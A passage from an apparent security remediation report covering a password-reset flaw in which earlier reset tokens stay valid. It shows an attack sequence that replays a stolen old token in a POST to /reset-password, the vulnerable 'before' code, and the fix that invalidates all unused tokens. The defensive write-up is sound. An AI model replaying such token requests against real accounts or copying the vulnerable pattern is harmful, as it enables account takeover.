2. Tuesday: User forgets, requests again → link_B in email
3. User uses link_B → password reset
4. Attacker had link_A from Monday's stolen email:
   POST /reset-password {"token": "link_A_token", "new_password": "Hacked123!"}
   → 200 OK!  # link_A still valid if we don't invalidate previous ones!
```

### Code before
```python
# Previous tokens remained active
async def forgot_password(body, db):
    user = db.query(User).filter(User.email == body.email).first()
    if user:
        # Creates new token without invalidating old ones
        token = secrets.token_urlsafe(32)
        db.add(PasswordResetToken(user_id=user.id, token=token, ...))
        db.commit()
        # link_A, link_B, link_C... all active simultaneously!
```

### Code after
```python
# api_gateway/routers/auth.py:193-200
if user:
    # Invalidate ALL previous tokens not yet used
    db.query(PasswordResetToken).filter(
        PasswordResetToken.user_id == user.id,
        PasswordResetToken.used == False,     # only those not yet used
    ).update({"used": True})                  # marked as used = invalidated
    db.commit()
    
    # Now create the fresh new token
    token = secrets.token_urlsafe(32)
    expires_at = datetime.now(timezone.utc) + timedelta(hours=1)
    db.add(PasswordResetToken(user_id=user.id, token=token, expires_at=expires_at))
    db.commit()
```

### Why it works
The bulk UPDATE `SET used=True WHERE user_id=? AND used=False` invalidates all previous tokens in a single atomic query **before** creating the new one. This ensures that at any given moment there is at most one valid token per user. The new link in the new email is the only working link.

### Impact
Previous reset links become useless as soon as the user requests a new one. An attacker with an old reset email can no longer use it after the victim has initiated a new recovery process.

---

*Document extracted from SECURITY_COMPLETE_REPORT.md — 2026-06-23*  
*Standard: OWASP API Security Top 10 (2023 Edition)*
